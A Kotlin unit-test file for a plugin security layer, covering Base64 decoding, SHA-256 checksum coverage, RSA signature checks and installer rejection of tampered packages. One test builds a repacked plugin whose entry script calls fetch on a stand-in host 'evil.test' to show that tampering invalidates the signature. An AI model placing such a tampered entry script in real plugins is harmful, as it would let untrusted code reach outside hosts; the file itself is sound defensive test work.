package com.x500x.cursimple.core.plugin.security

import com.x500x.cursimple.core.plugin.R
import com.x500x.cursimple.core.plugin.assertPluginError
import com.x500x.cursimple.core.plugin.install.InstalledPluginRecord
import com.x500x.cursimple.core.plugin.install.PluginInstallResult
import com.x500x.cursimple.core.plugin.install.PluginInstallSource
import com.x500x.cursimple.core.plugin.install.PluginInstaller
import com.x500x.cursimple.core.plugin.install.PluginRegistryRepository
import com.x500x.cursimple.core.plugin.packageformat.PluginPackageLayout
import com.x500x.cursimple.core.plugin.pluginErrorOf
import com.x500x.cursimple.core.plugin.storage.PluginFileStore
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.Json
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.ByteArrayOutputStream
import java.security.KeyPair
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.PrivateKey
import java.security.PublicKey
import java.security.Signature
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class Base64DecodeTest {
    @Test
    fun `decoder matches jdk output for every payload length`() {
        val encoder = java.util.Base64.getEncoder()
        (0..64).forEach { length ->
            val payload = ByteArray(length) { (it * 7 + 13).toByte() }
            assertArrayEquals(decodeBase64(encoder.encodeToString(payload)), payload)
        }
    }

    @Test
    fun `decoder ignores line breaks and spaces`() {
        val payload = ByteArray(96) { (it * 3).toByte() }
        val wrapped = java.util.Base64.getMimeEncoder().encodeToString(payload)

        assertArrayEquals(payload, decodeBase64(wrapped))
    }

    @Test
    fun `decoder rejects characters outside the standard alphabet`() {
        val error = runCatching { decodeBase64("AB*D") }.exceptionOrNull()

        assertPluginError(R.string.plugin_error_base64_illegal_character, error)
    }
}

class PluginChecksumVerifierTest {
    private val verifier = PluginChecksumVerifier()

    @Test
    fun `empty checksum map is rejected`() {
        val layout = layoutOf("manifest.json" to "{}", "main.js" to "ok")

        val error = runCatching {
            verifier.verify(layout, PluginChecksums(files = emptyMap()))
        }.exceptionOrNull()

        assertPluginError(R.string.plugin_error_checksum_empty, error)
    }

    @Test
    fun `missing coverage of a packaged file is rejected`() {
        val layout = layoutOf("manifest.json" to "{}", "main.js" to "ok")

        val error = runCatching {
            verifier.verify(
                layout,
                PluginChecksums(files = mapOf("manifest.json" to sha256("{}"))),
            )
        }.exceptionOrNull()

        assertPluginError(R.string.plugin_error_checksum_coverage_missing, error, "main.js")
    }

    @Test
    fun `full coverage with matching digests passes`() {
        val layout = layoutOf("manifest.json" to "{}", "main.js" to "ok")

        val verified = verifier.verify(
            layout,
            PluginChecksums(
                files = mapOf(
                    "manifest.json" to sha256("{}"),
                    "main.js" to sha256("ok"),
                ),
            ),
        )

        assertTrue(verified)
    }

    @Test
    fun `signature file does not need its own checksum entry`() {
        val layout = layoutOf(
            "manifest.json" to "{}",
            "main.js" to "ok",
            PluginPackageLayout.SIGNATURE_FILE to "{}",
        )

        val verified = verifier.verify(
            layout,
            PluginChecksums(
                files = mapOf(
                    "manifest.json" to sha256("{}"),
                    "main.js" to sha256("ok"),
                ),
            ),
        )

        assertTrue(verified)
    }

    @Test
    fun `mismatched digest fails without throwing`() {
        val layout = layoutOf("manifest.json" to "{}", "main.js" to "ok")

        val verified = verifier.verify(
            layout,
            PluginChecksums(
                files = mapOf(
                    "manifest.json" to sha256("{}"),
                    "main.js" to "0".repeat(64),
                ),
            ),
        )

        assertFalse(verified)
    }
}

class PluginSignatureVerifierTest {
    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }
    private val verifier = PluginSignatureVerifier()

    @Test
    fun `package without signature file reports absent`() {
        val checksums = """{"algorithm":"SHA-256","files":{}}"""
        val layout = layoutOf(PluginPackageLayout.CHECKSUMS_FILE to checksums)

        val result = verifier.resolve(layout, json)

        assertEquals(PluginSignatureStatus.Absent, result.status)
        assertNull(result.signerFingerprint)
    }

    @Test
    fun `signature over the checksum manifest is valid and exposes a fingerprint`() {
        val checksums = """{"algorithm":"SHA-256","files":{}}"""
        val keyPair = rsaKeyPair(2048)
        val layout = layoutOf(
            PluginPackageLayout.CHECKSUMS_FILE to checksums,
            PluginPackageLayout.SIGNATURE_FILE to signatureJson(keyPair, checksums),
        )

        val result = verifier.resolve(layout, json)

        assertEquals(PluginSignatureStatus.Valid, result.status)
        assertNotNull(result.signerFingerprint)
        assertEquals(47, result.signerFingerprint!!.length)
        assertEquals(fingerprintOf(keyPair.public), result.signerFingerprint)
    }

    @Test
    fun `signature over different content is invalid`() {
        val keyPair = rsaKeyPair(2048)
        val layout = layoutOf(
            PluginPackageLayout.CHECKSUMS_FILE to """{"algorithm":"SHA-256","files":{"a":"b"}}""",
            PluginPackageLayout.SIGNATURE_FILE to signatureJson(keyPair, "另一份清单"),
        )

        val result = verifier.resolve(layout, json)

        assertEquals(PluginSignatureStatus.Invalid, result.status)
        assertPluginError(R.string.plugin_error_signature_checksum_mismatch, result.error)
    }

    @Test
    fun `signature pointing at another file is invalid`() {
        val entry = "console.log(1)"
        val keyPair = rsaKeyPair(2048)
        val layout = layoutOf(
            PluginPackageLayout.CHECKSUMS_FILE to """{"algorithm":"SHA-256","files":{}}""",
            "main.js" to entry,
            PluginPackageLayout.SIGNATURE_FILE to signatureJson(keyPair, entry, signedFile = "main.js"),
        )

        val result = verifier.resolve(layout, json)

        assertEquals(PluginSignatureStatus.Invalid, result.status)
        assertPluginError(
            R.string.plugin_error_signature_scope,
            result.error,
            PluginPackageLayout.CHECKSUMS_FILE,
            "main.js",
        )
    }

    @Test
    fun `weak rsa key is invalid`() {
        val checksums = """{"algorithm":"SHA-256","files":{}}"""
        val keyPair = rsaKeyPair(1024)
        val layout = layoutOf(
            PluginPackageLayout.CHECKSUMS_FILE to checksums,
            PluginPackageLayout.SIGNATURE_FILE to signatureJson(keyPair, checksums),
        )

        val result = verifier.resolve(layout, json)

        assertEquals(PluginSignatureStatus.Invalid, result.status)
        assertPluginError(R.string.plugin_error_signature_key_too_weak, result.error, 1024)
    }

    @Test
    fun `legacy signature algorithm is invalid`() {
        val checksums = """{"algorithm":"SHA-256","files":{}}"""
        val keyPair = rsaKeyPair(2048)
        val layout = layoutOf(
            PluginPackageLayout.CHECKSUMS_FILE to checksums,
            PluginPackageLayout.SIGNATURE_FILE to signatureJson(
                keyPair = keyPair,
                payload = checksums,
                algorithm = "SHA1withRSA",
            ),
        )

        val result = verifier.resolve(layout, json)

        assertEquals(PluginSignatureStatus.Invalid, result.status)
        assertPluginError(
            R.string.plugin_error_signature_algorithm_unsupported,
            result.error,
            "SHA1withRSA",
        )
    }

    @Test
    fun `unparsable signature file is invalid`() {
        val layout = layoutOf(
            PluginPackageLayout.CHECKSUMS_FILE to """{"algorithm":"SHA-256","files":{}}""",
            PluginPackageLayout.SIGNATURE_FILE to "not json",
        )

        val result = verifier.resolve(layout, json)

        assertEquals(PluginSignatureStatus.Invalid, result.status)
    }
}

class PluginInstallerSignatureTest {
    @get:Rule
    val temporaryFolder = TemporaryFolder()

    @Test
    fun `unsigned package still installs`() = runBlocking {
        val installer = newInstaller("unsigned")

        val preview = installer.previewPackage(pluginZip(), PluginInstallSource.Remote)
        val result = installer.installPackage(pluginZip(), PluginInstallSource.Remote)

        assertEquals(PluginSignatureStatus.Absent, preview.signatureStatus)
        assertTrue(preview.installable)
        assertTrue(result is PluginInstallResult.Success)
    }

    @Test
    fun `validly signed package installs and reports the signer`() = runBlocking {
        val installer = newInstaller("signed")
        val bytes = pluginZip(signWith = rsaKeyPair(2048))

        val preview = installer.previewPackage(bytes, PluginInstallSource.Remote)
        val result = installer.installPackage(bytes, PluginInstallSource.Remote)

        assertEquals(PluginSignatureStatus.Valid, preview.signatureStatus)
        assertNotNull(preview.signerFingerprint)
        assertTrue(preview.installable)
        assertTrue(result is PluginInstallResult.Success)
    }

    @Test
    fun `package with a broken signature is rejected`() = runBlocking {
        val installer = newInstaller("broken-signature")
        val bytes = pluginZip(signWith = rsaKeyPair(2048), corruptSignature = true)

        val preview = installer.previewPackage(bytes, PluginInstallSource.Remote)
        val result = installer.installPackage(bytes, PluginInstallSource.Remote)

        assertEquals(PluginSignatureStatus.Invalid, preview.signatureStatus)
        assertFalse(preview.installable)
        assertTrue(result is PluginInstallResult.Failure)
        val failure = (result as PluginInstallResult.Failure).error
        assertPluginError(R.string.plugin_error_install_signature_rejected_detail, failure)
        assertPluginError(
            R.string.plugin_error_signature_checksum_mismatch,
            pluginErrorOf(failure).second.single() as Throwable,
        )
    }

    @Test
    fun `repacked content invalidates the signature even when checksums are recomputed`() = runBlocking {
        val installer = newInstaller("repacked")
        val bytes = pluginZip(
            signWith = rsaKeyPair(2048),
            entryScript = "export async function run(ctx) { return fetch('https://evil.test'); }",
            resignAfterTamper = false,
        )

        val preview = installer.previewPackage(bytes, PluginInstallSource.Remote)

        assertTrue(preview.checksumVerified)
        assertEquals(PluginSignatureStatus.Invalid, preview.signatureStatus)
        assertFalse(preview.installable)
    }

    private fun newInstaller(folder: String): PluginInstaller {
        return PluginInstaller(
            registryRepository = FakeRegistryRepository(),
            fileStore = PluginFileStore(temporaryFolder.newFolder(folder)),
        )
    }

    /**
     * [resignAfterTamper] 为 false 时用原始入口脚本签名，再把包内脚本换成 [entryScript] 并重算 checksums，
     * 模拟重打包但拿不到私钥的场景。
     */
    private fun pluginZip(
        signWith: KeyPair? = null,
        entryScript: String = DEFAULT_ENTRY,
        corruptSignature: Boolean = false,
        resignAfterTamper: Boolean = true,
    ): ByteArray {
        val files = linkedMapOf(
            "manifest.json" to MANIFEST,
            "main.js" to entryScript,
        )
        val checksums = checksumsJson(files.mapValues { (_, content) -> sha256(content) })
        val packaged = linkedMapOf<String, String>()
        packaged.putAll(files)
        packaged[PluginPackageLayout.CHECKSUMS_FILE] = checksums
        if (signWith != null) {
            val signedPayload = when {
                resignAfterTamper -> checksums
                else -> checksumsJson(
                    linkedMapOf(
                        "manifest.json" to sha256(MANIFEST),
                        "main.js" to sha256(DEFAULT_ENTRY),
                    ),
                )
            }
            packaged[PluginPackageLayout.SIGNATURE_FILE] = signatureJson(
                keyPair = signWith,
                payload = signedPayload,
                corrupt = corruptSignature,
            )
        }
        return zipBytes(packaged)
    }

    private class FakeRegistryRepository : PluginRegistryRepository {
        private val records = MutableStateFlow<List<InstalledPluginRecord>>(emptyList())

        override val installedPluginsFlow: Flow<List<InstalledPluginRecord>> = records

        override suspend fun getInstalledPlugins(): List<InstalledPluginRecord> = records.value

        override suspend fun find(pluginId: String): InstalledPluginRecord? =
            records.value.firstOrNull { it.pluginId == pluginId }

        override suspend fun findByInstallKey(installKey: String): InstalledPluginRecord? =
            records.value.firstOrNull { it.installKey == installKey }

        override suspend fun saveInstalledPlugin(record: InstalledPluginRecord) {
            records.value = records.value.filterNot { it.installKey == record.installKey } + record
        }

        override suspend fun removeInstalledPlugin(pluginId: String) {
            records.value = records.value.filterNot { it.pluginId == pluginId }
        }

        override suspend fun removeInstalledPluginByKey(installKey: String) {
            records.value = records.value.filterNot { it.installKey == installKey }
        }
    }

    private companion object {
        const val DEFAULT_ENTRY = "export async function run(ctx) { return ctx.schedule.commit({ courses: [] }); }"
        val MANIFEST = """
            {
              "id": "edu.demo",
              "name": "Demo",
              "version": "1.0.0",
              "versionCode": 1,
              "entry": "main.js",
              "permissions": ["schedule.write"],
              "allowedHosts": ["jw.demo.edu.cn"]
            }
        """.trimIndent()
    }
}

private fun layoutOf(vararg files: Pair<String, String>): PluginPackageLayout {
    return PluginPackageLayout(files.associate { (path, content) -> path to content.toByteArray() })
}

private fun zipBytes(files: Map<String, String>): ByteArray {
    val output = ByteArrayOutputStream()
    ZipOutputStream(output).use { zip ->
        files.forEach { (path, content) ->
            zip.putNextEntry(ZipEntry(path))
            zip.write(content.toByteArray())
            zip.closeEntry()
        }
    }
    return output.toByteArray()
}

private fun checksumsJson(files: Map<String, String>): String {
    val entries = files.entries.joinToString(",") { (path, checksum) -> """"$path":"$checksum"""" }
    return """{"algorithm":"SHA-256","files":{$entries}}"""
}

private fun sha256(content: String): String {
    return MessageDigest.getInstance("SHA-256")
        .digest(content.toByteArray())
        .joinToString("") { "%02x".format(it) }
}

private fun rsaKeyPair(bits: Int): KeyPair {
    return KeyPairGenerator.getInstance("RSA").apply { initialize(bits) }.generateKeyPair()
}

private fun signatureJson(
    keyPair: KeyPair,
    payload: String,
    algorithm: String = "SHA256withRSA",
    signedFile: String = PluginPackageLayout.CHECKSUMS_FILE,
    corrupt: Boolean = false,
): String {
    val raw = signBytes(keyPair.private, algorithm, payload.toByteArray())
    if (corrupt) {
        raw[0] = (raw[0].toInt() xor 0xFF).toByte()
    }
    val encoded = java.util.Base64.getEncoder().encodeToString(raw)
    return """
        {
          "algorithm": "$algorithm",
          "publicKeyPem": "${pemOf(keyPair.public)}",
          "signatureBase64": "$encoded",
          "signedFile": "$signedFile"
        }
    """.trimIndent()
}

private fun signBytes(privateKey: PrivateKey, algorithm: String, payload: ByteArray): ByteArray {
    val signature = Signature.getInstance(algorithm)
    signature.initSign(privateKey)
    signature.update(payload)
    return signature.sign()
}

private fun pemOf(publicKey: PublicKey): String {
    val body = java.util.Base64.getEncoder().encodeToString(publicKey.encoded)
    return "-----BEGIN PUBLIC KEY-----$body-----END PUBLIC KEY-----"
}

private fun fingerprintOf(publicKey: PublicKey): String {
    return MessageDigest.getInstance("SHA-256")
        .digest(publicKey.encoded)
        .take(16)
        .joinToString(":") { "%02X".format(it) }
}
